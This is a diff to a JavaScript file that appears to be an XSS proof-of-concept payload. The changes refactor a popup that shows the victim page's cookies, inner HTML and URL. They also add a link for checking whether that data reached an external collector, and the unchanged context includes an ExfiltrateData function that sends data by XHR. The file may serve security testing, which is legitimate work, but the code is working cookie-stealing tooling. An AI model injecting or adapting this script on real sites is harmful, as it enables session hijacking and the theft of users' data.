@@ -36,51 +36,62 @@ function ExfiltrateData(ID)
 	 xhr.send("XSS-TEST-"+ID);	
 }
 
+function BuildTitle(doc,name)
+{
+	var header = doc.document.createElement("h4");
+	header.style = "color:fff;";
+	header.innerHTML = name;
+	doc.document.body.appendChild(header);
+}
+
+function BuildTextArea(doc,height,data)
+{
+	var TextAreaStyle = "width:100%;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+	var txtArea = doc.document.createElement("TEXTAREA");
+	txtArea.innerHTML = data;
+	txtArea.style = "height:"+height+"px;"+TextAreaStyle;
+	doc.document.body.appendChild(txtArea);
+}
+
+function BuildButton(href,doc,val)
+{
+	var aExData = doc.document.createElement("a");
+	aExData.style = "color:000;margin-Top:15px;margin-left:0px;margin-right:0px;box-shadow:inset 0px 1px 0px 0px #ffffff;	background:linear-gradient(to bottom, #ffffff 5%, #f6f6f6 100%);	background-color:#ffffff;	border-radius:6px;	border:1px solid #dcdcdc;	display:block;	cursor:pointer;	color:#666666;	font-family:Arial;	font-size:15px;	font-weight:bold;	padding:6px 24px;	text-decoration:none;	text-shadow:0px 1px 0px #ffffff;";
+	aExData.innerHTML = val;
+	aExData.href = href;
+	aExData.target="_blank";
+	doc.document.body.appendChild(aExData);
+}
+
 function createPopup(){
-var TextAreaStyle = "margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+
 var popup = open("", "", "width=800,height=600,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
 popup.document.body.style.background = "rgb(53, 53, 53)";
-//Cookie Doc Header
-var hCookie = popup.document.createElement("h4");
-hCookie.style = "color:fff;";
-hCookie.innerHTML = "Document Cookie";
-popup.document.body.appendChild(hCookie);
 popup.document.title = "XSS Data";
+//URL Header
+BuildTitle(popup,"Document Location");
+//URL Doc
+BuildTextArea(popup,20, DocLocation);
+
+//Cookie Doc Header
+BuildTitle(popup,"Document Cookie");
+
 //Cookie Doc
-var txtCookie = popup.document.createElement("TEXTAREA");
-txtCookie.innerHTML = UsersCookie;
-txtCookie.style = "width:100%;height:150px;"+TextAreaStyle;
-popup.document.body.appendChild(txtCookie);
+BuildTextArea(popup,100, UsersCookie);
 
 //Doc Header
-var hDocumentInner = popup.document.createElement("h4");
-hDocumentInner.style = "color:fff;";
-hDocumentInner.innerHTML = "Document Inneer HTML";
-popup.document.body.appendChild(hDocumentInner);
+BuildTitle(popup,"Document Inner HTML");
 //Cookie Doc
-var txtDocumentInner = popup.document.createElement("TEXTAREA");
-txtDocumentInner.innerHTML = DocHTML;
-txtDocumentInner.style = "width:100%;height:150px;"+TextAreaStyle;
-popup.document.body.appendChild(txtDocumentInner);
+BuildTextArea(popup,100, DocHTML);
 
 //URL Header
-var hURLInner = popup.document.createElement("h4");
-hURLInner.style = "color:fff;";
-hURLInner.innerHTML = "Document Location";
-popup.document.body.appendChild(hURLInner);
+BuildTitle(popup,"Exfiltration ID");
 //URL Doc
-var txtURLInner = popup.document.createElement("TEXTAREA");
-txtURLInner.innerHTML = DocLocation;
-txtURLInner.style = "width:100%;height:20px;"+TextAreaStyle;
-popup.document.body.appendChild(txtURLInner);
+BuildTextArea(popup,20, TimeAsMS);
 
 //ExfiltrateData
-var aExData = popup.document.createElement("a");
-aExData.style = "color:fff;";
-aExData.innerHTML = "Was this data exfiltrated to external source?";
-aExData.href = Toilet;
-aExData.target="_blank";
-popup.document.body.appendChild(aExData);
+
+BuildButton(Toilet,popup,"Check Data Was Exfiltrated");
 
 }
 
